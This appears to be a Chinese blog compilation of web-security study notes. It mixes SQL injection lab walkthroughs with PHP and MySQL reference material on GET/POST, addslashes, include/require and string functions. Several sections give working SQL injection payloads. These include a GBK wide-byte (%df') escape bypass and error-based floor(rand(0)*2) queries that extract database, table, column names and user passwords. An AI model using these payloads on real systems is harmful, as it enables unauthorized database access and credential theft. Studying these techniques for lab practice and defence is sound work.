这关对\，‘，“进行了过滤。

知识补充：

mysql_query("SET NAMES gbk");

对client，conncetion，results的编码方式都设置成了GBK。而我们传进去的数据是以UTF-8进行编码。GBK英文和中文字符都用2个字节进行编码，而UTF-8英文字符使用1个字符，中文则使用3个字节。（具体详情参考我的GBK和UTF-8编码的区别文章）

当GBK对UTF-8编码的数据进行解码，如果高字节>128，低字节也符合相应的要求的话。会被误认为是中文字符进行拼接。

我们用GET注入使传进去的数据会自动进行一次URL编码。因为过滤’，”，\（\是%5c)，如果传进去是1‘会变成1%5c%27。这时’被转义了。如果在‘前加%df呢，会被编码成1%df%5c%27这时传进进行解码，GBK会认为%df%5c是一个整体而解析成一个汉字，而%27即’会被认为是个单独的字符进行解析这样解析完会变成1+中文字符+‘这是’并没并转义。所以成功绕过。

可以构造句子如：

？id=-1%df' union select 1,2,3 --+

其他思想和前面一样。这里不一定要用%df，大于128都可以。

GET请求和POST请求

2020-11-27

1.GET请求

①GET请求：用于从服务器中获取数据。

②GET请求是将表单中的数据按 name=value 的形式，添加到 action 所指向的 URL 后面通过URL请求来传递用户输入的数据。

③GET请求的参数接在URL后面，两者间用?连接，每个参数间用&连接。

④GET请求采用URL编码。

⑤GET请求发送的数据长度有限制。

1、IE

IE浏览器（Microsoft Internet Explorer） 对url长度限制是2083（2K+53），超过这个限制，则自动截断。

2、firefox

firefox（火狐浏览器）的url长度限制为 65 536字符，但实际上有效的URL最大长度不少于100,000个字符。

3、chrome

chrome（谷歌）的url长度限制超过8182个字符返回414错误。

4、Safari

Safari的url长度限制至少为 80 000 字符。

5、Opera

Opera 浏览器的url长度限制为190 000 字符。Opera 9 地址栏中输入190 000字符时依然能正常编辑。

⑥GET请求会将敏感数据显示在地址栏上。

如果不是敏感数据可以使用GET请求来传递，敏感数据最好不要使用GET请求方式进行传送不安全。

2.POST请求

①POST请求通常是用来向服务器提交数据的。

②POST请求一般是以表单输入框的方式填写用户的数据，把表单数据发送给服务器验证的一个过程。

③POST请求没有长度的限制。

④POST请求支持多种编码方式。

⑤POST请求的参数不会被保留，而GET请求的参数会被完整保留在浏览器历史记录里。

⑥POST相对于GET来说更安全。一般网页都用POST请求来发送敏感数据。

isset() 检查变量是否存在。

若变量不存在或为NULL，返回FALSE。

若变量不为NULL时，返回TRUE。

若变量为多个时，必须都不为NULL，才返回TRUE。

mysql_query(query,connection)执行一条MySQL查询。

query:(必需)规定要发送的SQL查询语句。注‘查询字符串不应以分号结束。

connection：(可选)SQL连接标识符。如果未规定，则使用上次的打开的连接。

如果之前没有打开连接，这个函数会尝试无参数调用mysql_conncet()来建立连接。

注：此函数仅对select,show,explain,describe句子返回资源标识符，如果查询失败则返回false。

对其他的SQL语句，执行成功则返回TRUE，失败则返回false。

例子：

<?php
$con = mysql_connect("localhost","mysql_user","mysql_pwd");
if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }

$sql = "SELECT * FROM Person";

// 一些代码

mysql_close($con);
?>

resulttype:(可选)规定要返回哪种类型的数组。

  • MYSQLI_ASSOC(关联数组)

addslashes()和htmlspecialchars()的相同和区别

二者都用来都特殊符号进行转义，用于防止SQL语句的注入。

①addslashes()通常用于防止sql注入，它可对通过get，post和cookie传递过来的参数的单引号、双引号、\以及null前加“\”进行转义

如：如变量$str=$_POST[“str”];的值为：bb’ or 1=’1。通过addslashes()函数过滤后会变为：bb斜杆' or 1=斜杆'1。

②htmlspecialchars()也是对字符进行转义，与addslashes（）不同的是htmlspecialchars()是将特殊字符用引用实体替换。

③addslashes()在执行sql语句前对通过get、post和cookie传递来的参数中的单引号，双引号,\ 和null进行转义。但sql执行成功后，插入到数据库中的数据是不带有转义字符\的。这时如果插入到数据库中的是一些js脚本，当这些脚本被读取出来时还是会被执行。

这时我们可对读取出来的数据使用htmlspecialchars()进行过滤，避免执行被注入的脚本。

④在使用这两个函数之前需要先使用get_magic_quotes_gpc()验证下php.ini配置文件里的magic_quotes_gpc设置是否自动为GPC(get,post,cookie)传来的数据中的’”加上反斜线。如果没有确定直接使用该函数，可能造成双层转义。

get_magic_quotes_gpc()

用于检验php.ini配置文件中magic_quotes_gpc的设置是否开启自动为GPC(GET,POST,COOKIE)传来的数据进行转义。

Include()和require ()文件的区别

  • require 会生成致命错误（E_COMPILE_ERROR）并停止脚本
  • include 只生成警告（E_WARNING），并且脚本会继续

注：

①如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。

include 引入文件的时候，如果碰到错误，会给出提示，并继续运行下边的代码。

require 引入文件的时候，如果碰到错误，会给出提示，并停止运行下边的代码。

②

  • include 在执行到的时候才加载
  • require 在一开始就加载

③后缀_once

include_once() 和 require_once() 和原来的区别是：已加载过的不加载。这两个语句用于在脚本执行期间，同一个文件有可能被包括超过一次的情况下，确保它只被包括一次，以避免函数重定义以及变量重新赋值等问题。

语法：

include 'filename';

例子：

假设我们有一个名为 “footer.php” 的标准的页脚文件，就像这样：

<?php
echo "<p>Copyright © 2006-" . date("Y") . " W3School.com.cn</p>";
?>

如需在一张页面中引用这个页脚文件，使用 include 语句：

<html>
<body>

<h1>欢迎访问我们的首页！</h1>
<p>一段文本。</p>
<p>一段文本。</p>
<?php 
include ("footer.php");
?>

</body>
</html>

  • 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。
  • 64 位系统上，最大带符号的 integer 值是 9223372036854775807。
  • intval() 不能用于数组 或 对象(类)，否则会产生 E_NOTICE 错误并返回 1。

注：默认使用十进制。

成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。

第一步：?id=1 回显正常

第二步：?id=1’ 语法报错

第三步：?id=1 and 1=1 回显正常

第四步：?id=1 and 1=2 页面错误

1.报错注入

例子：Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;

需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand()0-1随机数函数，group by 分组。

rand(0) 指定一个固定参数可以制造一个伪随机序列。即可以预测下次出啥数字。

这个报错是利用排序时插入的key值不能相同而报错。利用报错回显出key值。

id=-1' union select count(*),concat(0x3a,(select database()),floor(rand(0)*2))a,3 from information_schema.columns group by a--+

id=-1' union select count(*),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema='security'),floor(rand(0)*2))a,3 from information_schema.tables group by a--+

查字段名：

id=-1' union select count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='users' limit 4,1),floor(rand(0)*2))a,3 from information_schema.columns group by a--+

爆数据：

id=-1' union select count(*),concat(0x3a,(select password from security.users limit 5,1),floor(rand(0)*2))a,3 from information_schema.columns group by a--+

mysql语法总结

2020-11-21

1.concat()

Ⅰ.concat(str1, str2,…) 返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
Ⅱ.concat_ws(separator, str1, str2, …)第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。
Ⅲ.group_concat()默认以逗号分隔。

2.having()

where 关键字无法与合计函数一起使用

例子：

SELECT Customer,SUM(OrderPrice) FROM Orders
WHERE Customer='Bush' OR Customer='Adams'
GROUP BY Customer
HAVING SUM(OrderPrice)>1500

3.order by()

对列进行排序 ASC 升序，DESC降序，默认升序。

SQL注入中利用该函数判断列数。

4.ord()和ascii()功能一样

5.mid()和substr()功能一样

substr(a,b,c)从b位开始，截取a的c位。

结合ascii()函数用于盲猜，sql注入时列名，表名，数据库名。

6.length()

用于猜测长度，一般用于猜测数据库名长度。

7.left()和right()

left(a,b)有a的左侧起b位。一般用于猜测数据名，比第5点那种猜法好用点。
